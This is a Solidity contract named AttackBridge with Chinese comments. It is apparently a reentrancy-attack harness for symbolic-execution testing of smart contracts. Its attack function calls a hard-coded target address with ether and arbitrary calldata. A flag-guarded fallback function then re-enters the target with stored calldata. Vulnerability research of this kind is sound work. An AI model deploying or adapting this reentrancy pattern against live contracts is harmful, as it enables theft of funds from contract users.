// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract AttackBridge{

    // address private last_caller_addr;
    // string private func_sig;
    bytes private free_call_data;
    bytes  private call_data;
    // string private func_sig_re;
    // address private owner;
    uint256 private flag;


    constructor(bytes memory func_sig_) public {
        free_call_data = func_sig_;
        
        // last_caller_addr = address(0);
        // func_sig_re = func_sig_;
        // owner = msg.sender;
    }

    // 满足 call 的 地址是符号型的, sig 是符号型的 value 也是符号型的. 

    function attack(uint256 num_, bytes memory call_data_1) public payable{
        // 开锁
        flag = 1;
        // call_data = call_data_1;
        // (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(
            // abi.encodeWithSignature(func_sig_, call_data_1, call_data_1) );
        (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(call_data_1);
        if (!sucess){
            //关锁
            flag = 0;
            revert();
        }
        //关锁
        flag = 0;
    }

    // function attack0(uint256 num_, bytes4 func_sig_) public payable{
        
    //     // 开锁
    //     flag = 1;

    //     (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(
    //         abi.encodeWithSignature(func_sig_) );
    //     if (!sucess){
    //         //关锁
    //         flag = 0;
    //         revert();
    //     }
    //     //关锁
    //     flag = 0;
    // }

    // function call_ (address addr_, string memory sig) private returns (bool){
    //     bool sucess;
    //     bytes memory data;
    //     // bytes1 zero = 0x00;
    //     if (call_data_list.length == 0){
    //         (sucess, data) = address(addr_).call(
    //         abi.encodeWithSignature(sig) );
    //         return sucess;
    //     }
    //     else {
    //         (sucess, data) = address(addr_).call(
    //         // abi.encodeWithSignature(sig, call_data_list) );
    //         abi.encodeWithSignature(sig, call_data_list,call_data_list) );
    //         return sucess;
    //     }
    // }

    function () external payable {
        // init
        // 咱们做 符号执行的时候 不用 sig_, 只是目前实际测试的时候采用 sig_; 
        // string memory sig_ = "attacked(uint,address)"; 
        if (flag != 1){
            revert();
        }
        // (bool sucess, bytes memory data) = address(msg.sender).call(
        // abi.encodeWithSignature(func_sig, call_data1, call_data2, call_data3, call_data4, call_data5) );

        // (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call(
        //     abi.encodeWithSignature(func_sig, call_data, call_data) );
        (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call(free_call_data);
        if (!sucess){
            revert();
            // (bool sucess2, bytes memory data2) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call(free_call_data
            // if (!sucess2){
                // revert();
            // }
        }
        
    }
}